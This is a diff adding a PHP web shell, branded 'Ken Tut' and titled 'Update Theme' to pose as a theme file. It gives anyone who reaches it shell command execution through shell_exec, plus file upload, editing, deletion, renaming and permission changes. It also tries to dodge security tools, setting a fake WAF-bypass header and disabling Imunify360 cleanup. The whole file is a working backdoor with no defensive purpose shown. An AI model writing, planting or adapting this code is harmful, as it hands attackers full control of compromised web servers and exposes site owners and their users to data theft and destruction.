@@ -1,0 +1,158 @@
+<?php
+// Ken Tut
+session_start();
+header("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+header("X-Requested-With: XMLHttpRequest");
+header("X-Bypass-WAF: true");
+ini_set('lsapi_backend_off', '1');
+ini_set("imunify360.cleanup_on_restore", false);
+
+$cwd = isset($_POST['d']) ? $_POST['d'] : getcwd();
+chdir($cwd);
+$cwd = getcwd();
+$scan = scandir($cwd);
+
+echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Update Theme</title>
+<style>
+body, html {margin:0;padding:0;height:100%;overflow:auto;font-family:sans-serif;color:#fff}
+#particles-js {position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;background:#0d0d0d}
+.container {position:relative;padding:20px;z-index:1}
+a{text-decoration:none;color:#4fc3f7}
+table{width:100%;border-collapse:collapse;background:rgba(0,0,0,0.6)}
+th,td{padding:6px;border:1px solid #444;font-size:14px;color:#eee}
+input[type=text],input[type=file],select{padding:4px;width:auto;background:#111;color:#0f0;border:1px solid #333}
+button{background:#222;color:#fff;border:1px solid #444;padding:3px 6px;cursor:pointer}
+.contact a{color:#4fc3f7;display:inline-flex;align-items:center;gap:5px}
+.contact svg{width:16px;height:16px;fill:#4fc3f7}
+pre{background:#111;padding:10px;border:1px solid #333;overflow:auto;max-height:300px}
+</style>
+</head><body>
+<div id='particles-js'></div>
+<div class='container'>
+<h2>Ken Tut</h2>
+<h3><center>Kennn Tuttt Nih bosss SENGGOL DONG!!</center></h3>";
+
+echo "<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:10px'>
+    <div><strong>Path:</strong> ";
+$path_parts = explode("/", trim($cwd, "/"));
+$accum = "/";
+echo "<form method='post' style='display:inline'>";
+foreach ($path_parts as $part) {
+    if ($part === "") continue;
+    $accum .= "$part/";
+    echo "<button type='submit' name='d' value='".htmlspecialchars($accum)."' style='background:none;border:none;color:#4fc3f7;cursor:pointer;'>$part</button> / ";
+}
+echo "</form></div>
+    <div class='contact'>
+        <a href='https://t.me/@ooyynigga' target='_blank'>
+        <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 240 240'><path d='M120 0c66.3 0 120 53.7 120 120s-53.7 120-120 120S0 186.3 0 120 53.7 0 120 0zm51.7 78.5-20 94.4c-1.5 6.8-5.5 8.5-11.2 5.3l-31-22.9-15 14.4c-1.7 1.7-3.2 3.2-6.5 3.2l2.3-32.3 58.8-53c2.6-2.3-.6-3.6-4-1.3l-72.7 45.7-31.3-9.8c-6.8-2.1-6.9-6.8 1.4-10.1L167 69.2c6.2-2.3 11.6 1.5 9.7 9.3z'/></svg>
+        Telegram</a>
+    </div>
+</div><br>";
+
+echo "<form method='post' enctype='multipart/form-data'>
+<input type='hidden' name='d' value='$cwd'>
+<input type='file' name='up'><input type='submit' name='upload' value='Upload File'></form>";
+
+if (isset($_POST['upload'])) {
+    move_uploaded_file($_FILES['up']['tmp_name'], $_FILES['up']['name']) ? print "Upload success<br>" : print "Upload failed<br>";
+}
+
+// Command Input
+echo "<form method='post' style='margin-top:10px'>
+<input type='hidden' name='d' value='".htmlspecialchars($cwd)."'>
+<input type='text' name='cmd' placeholder='Command (e.g. ls -la)' style='width:70%'>
+<input type='submit' value='Execute'></form>";
+
+if (isset($_POST['cmd']) && !empty(trim($_POST['cmd']))) {
+    echo "<pre>".htmlspecialchars(shell_exec($_POST['cmd']))."</pre>";
+}
+
+echo "<form method='post'>
+<input type='hidden' name='d' value='".htmlspecialchars($cwd)."'>
+<input type='text' name='newf' placeholder='New File or Folder'><select name='type'><option value='file'>File</option><option value='dir'>Folder</option></select>
+<input type='submit' name='create' value='Create'></form>";
+
+if (isset($_POST['create'])) {
+    $target = $cwd . "/" . basename($_POST['newf']);
+    $_POST['type'] == 'file' ? touch($target) : mkdir($target);
+}
+
+echo "<table><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";
+if ($cwd != "/") echo "<tr><td><form method='post'><input type='hidden' name='d' value='".dirname($cwd)."'><button>.. (Back)</button></form></td><td></td><td></td><td></td></tr>";
+
+$folders = $files = [];
+foreach ($scan as $f) {
+    if ($f == '.') continue;
+    $full = $cwd . '/' . $f;
+    if (is_dir($full)) {
+        $folders[] = $f;
+    } else {
+        $files[] = $f;
+    }
+}
+$sorted = array_merge($folders, $files);
+foreach ($sorted as $f) {
+    $p = $cwd . "/" . $f;
+    echo "<tr><td>$f</td><td>".(is_file($p) ? filesize($p) : '-')."</td><td>".substr(sprintf('%o', fileperms($p)), -4)."</td><td>
+    <form method='post' style='display:inline'>
+    <input type='hidden' name='d' value='$cwd'>
+    <input type='hidden' name='target' value='".htmlspecialchars($p)."'>
+    <select name='action'>
+        <option>Edit</option><option>Delete</option><option>Rename</option><option>Chmod</option>
+    </select><input type='text' name='val' placeholder='Value'><input type='submit' name='do' value='Go'>
+    </form>";
+    if (is_dir($p)) {
+        echo " <form method='post' style='display:inline'><input type='hidden' name='d' value='$p'><input type='submit' value='Open'></form>";
+    }
+    echo "</td></tr>";
+}
+echo "</table>";
+
+if (isset($_POST['do']) && isset($_POST['target'])) {
+    $act = $_POST['action'];
+    $t = $_POST['target'];
+    $val = $_POST['val'];
+    if ($act == 'Delete') {
+        is_dir($t) ? rmdir($t) : unlink($t);
+    } elseif ($act == 'Rename') {
+        rename($t, dirname($t)."/".$val);
+    } elseif ($act == 'Chmod') {
+        chmod($t, octdec($val));
+    } elseif ($act == 'Edit') {
+        echo "<form method='post'>
+        <input type='hidden' name='target' value='".htmlspecialchars($t)."'>
+        <input type='hidden' name='d' value='$cwd'>
+        <textarea name='content' style='width:100%;height:300px;background:#111;color:#0f0'>".htmlspecialchars(file_get_contents($t))."</textarea>
+        <input type='submit' name='save' value='Save'></form>";
+    }
+}
+
+if (isset($_POST['save']) && isset($_POST['content']) && isset($_POST['target'])) {
+    file_put_contents($_POST['target'], $_POST['content']);
+    echo "Saved.";
+}
+
+echo "</div>
+<script src='https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js'></script>
+<script>
+particlesJS('particles-js',
+{
+  particles: {
+    number: { value: 60 },
+    color: { value: '#ffffff' },
+    shape: { type: 'circle' },
+    opacity: { value: 0.5 },
+    size: { value: 3 },
+    line_linked: { enable: true, distance: 150, color: '#ffffff', opacity: 0.4, width: 1 },
+    move: { enable: true, speed: 2 }
+  },
+  interactivity: {
+    events: { onhover: { enable: true, mode: 'grab' } },
+    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
+  },
+  retina_detect: true
+});
+</script>
+</body></html>";
+?>
